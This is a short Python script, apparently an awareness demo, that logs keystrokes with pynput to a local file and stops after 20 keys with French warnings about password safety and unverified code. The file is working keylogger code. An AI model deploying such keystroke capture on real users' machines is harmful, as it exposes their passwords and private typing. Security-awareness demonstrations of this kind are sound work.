from pynput import keyboard
import time

FILENAME = "keystrokes.txt"
MAX_KEYS = 20  # Alerte après 20 frappes

keys_pressed = []

def write_to_file(keys):
    with open(FILENAME, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(" ")
            elif k == "Key.enter":
                f.write("\n")
            elif "Key" not in k:
                f.write(k)

def on_press(key):
    keys_pressed.append(key)
    if len(keys_pressed) >= MAX_KEYS:
        write_to_file(keys_pressed)
        keys_pressed.clear()
        print("\n Alerte : Vous venez de taper 20 touches.")
        print("🛡️  Ce script montre à quel point il est facile de logger vos frappes clavier.")
        print("🔒 Pensez à protéger vos mots de passe et ne téléchargez jamais de code non vérifié.")
        print(f"(Les frappes ont été enregistrées dans {FILENAME})")
        return False  # Arrête le keylogger

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
